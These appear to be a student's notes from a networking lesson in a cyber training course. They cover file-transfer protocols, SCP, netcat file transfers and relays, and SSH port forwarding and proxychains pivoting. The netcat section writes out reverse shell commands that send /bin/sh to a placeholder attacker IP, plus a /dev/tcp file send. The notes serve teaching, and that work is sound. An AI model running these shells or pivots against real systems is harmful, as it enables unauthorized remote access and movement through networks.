------------------------------------------------------------------------------------------------------------------------
NETWORKING DAY 6 LINKS:
  STUDENT FG: https://net.cybbh.io/public/networking/latest/lesson-4-movement_redirection/fg.html
  STUDENT SLIDES: https://net.cybbh.io/-/public/-/jobs/842494/artifacts/modules/networking/slides/3-Network_Reconnaissance.html
------------------------------------------------------------------------------------------------------------------------
GENERAL NOTES
DATA PROTOCOLS: TFTP, FTP, SFTP, FTPS, SCP, Netcat
TFTP:
  RFC 1350 REV2
  UDP TRANSPORT
  EXTREMELY SMALL AND VERY SIMPLE COMMUNICATION
  NO TERMINAL COMMUNICATION ()
  INSECURE (NO AUTHENTICATION OR ENCRYPTION)
  NO DIRECTORY SERVICES
  USED OFTEN FOR TECHNOLOGIES SUCH AS BOOTP AND PXE
------------
FTP:
  FILE TRANSFER PROTOCOL
  RFC 959
  TCP TRANSPORT
  USES MULTIPLE TCP CONNECTIONS
  CONTROL CONNECTION (21) / DATA CONNECTION (20)
  AUTHENTICATION THROUGH CLEAR-TEXT SIGN IN (USERNAME AND PASSWORD)
  INSECURE IN DEFAULT CONFIGURATION
  HAS DIRECTORY SERVICES
  CAN BE ENHANCED WITH SSL/TLS (FTPS)
  ANONYMOUS LOGIN
SFTP:
  SECURE FILE TRANSFER PROTOCOL
  TCP TRANSPORT (TCP PORT 22)
  USES SYMMETRIC AND ASYMMETRIC ENCRYPTION
  ADDS FTP LIKE SERVICES TO SSH
  AUTHENTICATION THROUGH SIGN IN (USERNAME AND PASSWORD) OR WITH SSH KEY
  INTERACTIVE TERMINAL ACCESS
------------
FTPS:
  FILE TRANSFER PROTOCOL SECURE
  TCP TRANSPORT (TCP PORT 443)
  ADDS SSL/TLS ENCRYPTION TO FTP
  AUTHENTICATION WITH USERNAME/PASSWORD AND/OR PKI
  INTERACTIVE TERMINAL ACCESS
------------
SCP
  SECURE COPY PROTOCOL
  TCP TRANSPORT (TCP PORT 22)
  USES SYMMETRIC AND ASYMMETRIC ENCRYPTION
  AUTHENTICATION THROUGH SIGN IN (USERNAME AND PASSWORD) OR WITH SSH KEY
  NON INTERACTIVE
  SCP SYNTAX:
    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
      $ SCP STUDENT@172.16.82.106:SECRETSTUFF.TXT /HOME/STUDENT
    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY
      $ SCP SECRETSTUFF.TXT STUDENT@172.16.82.106:/HOME/STUDENT
    COPY A FILE FROM A REMOTE HOST TO A SEPARATE REMOTE HOST
      $ SCP -3 STUDENT@172.16.82.106:/HOME/STUDENT/SECRETSTUFF.TXT STUDENT@172.16.82.112:/HOME/STUDENT
  SCP SYNTAX W/ ALTERNATE SSHD:
    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
      scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY:
      scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
  SCP SYNTAX THROUGH A TUNNEL:
    ssh student@172.16.82.106 -L 1111:localhost:22 -NT
    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
      scp -P 1111 student@localhost:secretstuff.txt /home/student
    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY
      scp -P 1111 secretstuff.txt student@localhost:/home/student
------------
NETCAT:
NETCAT IS THE "SWISS ARMY KNIFE" NETWORKING UTILITY WHICH READS AND WRITES DATA ACROSS NETWORK SOCKET CONNECTIONS USING THE TCP/IP PROTOCOL. 
IT IS DESIGNED TO BE A RELIABLE "BACK END" TOOL THAT CAN BE USED DIRECTLY OR EASILY DRIVEN BY OTHER PROGRAMS AND SCRIPTS.
CAN BE USED FOR THE FOLLOWING:
  INBOUND AND OUTBOUND CONNECTIONS, TCP/UDP, TO OR FROM ANY PORTS
  TROUBLESHOOTING NETWORK CONNECTIONS
  SENDING/RECEIVING DATA (INSECURELY)
  NETCAT: CLIENT TO LISTENER FILE TRANSFER:
    Client (sends file): nc 10.2.0.2 9001 < file.txt
    Listener (receive file): nc -l -p 9001 > newfile.txt
  NETCAT: LISTENER TO CLIENT FILE TRANSFER
    Listener (sends file): nc -l -p 9001 < file.txt
    Client (receive file): nc 10.2.0.2 9001 > newfile.txt
  NETCAT RELAY DEMOS:
    On Client Relay:
      mknod mypipe p
      nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
    On Listener2 (sends info):
      nc -l -p 9002 < infile.txt
    On Listener1 (receives info):
      nc -l -p 9001 > outfile.txt
    WRITES THE OUTPUT TO Listener1 AND Listener2 THROUGH THE NAMED PIPE
  FILE TRANSFER WITH /DEV/TCP:
    On the receiving box:
      nc -l -p 1111 > file.txt
    On the sending box:
      cat file.txt > /dev/tcp/10.2.0.2/1111
    THIS METHOD IS USEFUL FOR HOST THAT DOES NOT HAVE NETCAT AVAILABLE.
  REVERSE SHELL USING NETCAT:
    When shelled into the remote host using -c :
      nc -c /bin/sh <your ip> <any unfiltered port>
    YOU COULD EVEN PIPE BASH THROUGH NETCAT:
      /bin/sh | nc <your ip> <any unfiltered port>
    THEN LISTEN FOR THE SHELL:
      nc -l -p <same unfiltered port> -vvv
    YOU CAN ALSO LISTEN USING THE -e WITH NETCAT:
      nc -l -p <any unfiltered port> -e /bin/bash
------------
SSH:
  VARIOUS IMPLEMENTATIONS (V1 AND V2)
  PROVIDES AUTHENTICATION, ENCRYPTION, AND INTEGRITY.
  ALLOWS REMOTE TERMINAL SESSIONS
  USED FOR TUNNELING
  CREATED AS A SECURE REPLACEMENT FOR BERKELEY REMOTE COMMANDS:
  RSH - REPLACED WITH SSH, PROVIDES A CHANNEL FOR RUNNING A SHELL ON A REMOTE COMPUTER.
  RLOGIN - REPLACED WITH RLOGIN, PROVIDES REMOTE
  SSH PORT FORWARDING:
    CREATES CHANNELS USING SSH-CONN PROTOCOL
    ALLOWS FOR TUNNELING OF OTHER SERVICES THROUGH SSH
    PROVIDES INSECURE SERVICES ENCRYPTION
  ------
  SSH LOCAL PORT FORWARDING (SYNTAX AS FOLLOWS):
      ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
    OR:
      ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
    EXAMPLE:
    CREATES A LOCAL PORT (1111) ON THE LOCAL HOST THAT FORWARDS TO A TARGET MACHINE’S PORT 80.
      ssh student@172.16.82.106 -L 1111:localhost:80 -NT
    OR:
      ssh -L 1111:localhost:80 student@172.16.82.106 -NT
  SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT:
    Internet Host:
      ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
      ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
      firefox localhost:2222
      CREATES AN ADDITIONAL LOCAL PORT ON THE LOCAL HOST THAT FORWARDS TO A TARGET MACHINE THROUGH THE PREVIOUS CHANNEL CREATED.
  ------
  SSH DYNAMIC PORT FORWARDING (SYNTAX AS FOLLOWS):
      ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
    PROXYCHAINS DEFAULT PORT IS 9050
    CREATES A DYNAMIC SOCKS4 PROXY THAT INTERACTS ALONE, OR WITH A PREVIOUSLY ESTABLISHED REMOTE OR LOCAL PORT FORWARD.
    ALLOWS THE USE OF SCRIPTS AND OTHER USERSPACE PROGRAMS THROUGH THE TUNNEL.
  SSH DYNAMIC PORT FORWARDING 1-STEP:
    Blue Private Host-1:
    ssh student@172.16.82.106 -D 9050 -NT
    proxychains ./scan.sh
    proxychains ssh student@10.10.0.40
  SSH DYNAMIC PORT FORWARDING 2-STEP:
    Blue Private Host-1:
      ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
      ssh student@localhost -D 9050 -p 1111 -NT
      proxychains curl ftp://www.onlineftp.ch
      proxychains wget -r www.espn.com
      proxychains ./scan.sh
      proxychains ssh student@172.16.101.2
  SSH REMOTE PORT FORWARDING (SYNTAX AS FOLLOWS):
      ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
    OR:
      ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
    EXAMPLE:
    CREATES A REMOTE PORT ON THE REMOTE’S LOCAL HOST THAT FORWARDS TO THE TARGET SPECIFIED.
      Blue Host-1
        ssh student@10.10.0.40 -R 1111:localhost:80 -NT
  SSH REMOTE AND LOCAL PORT FORWARDING (EXAMPLE AS FOLLOWS):
    Blue Private Host-1:
      ssh student@172.16.82.106 -R 1111:localhost:22 -NT
    Internet Host:
      ssh student@172.16.82.106 -L 2222:localhost:1111 -NT
    Internet Host:
      ssh localhost -p 2222
------------
COVERT CHANNEL NOTES:
  - METHOD OF INFORMATION OBJECT TRANSFER BETWEEN ENDPOINTS THAT SHOULD BE ILLEGAL BASED ON CURRENT POLICY
  - TUNNEL STRATEGIES EMPLOYED FOR THIS PURPOSE INCLUDE: ICMP, DNS, HTTP
------------------------------------------------------------------------------------------------------------------------
CTFD CHALLENGES 
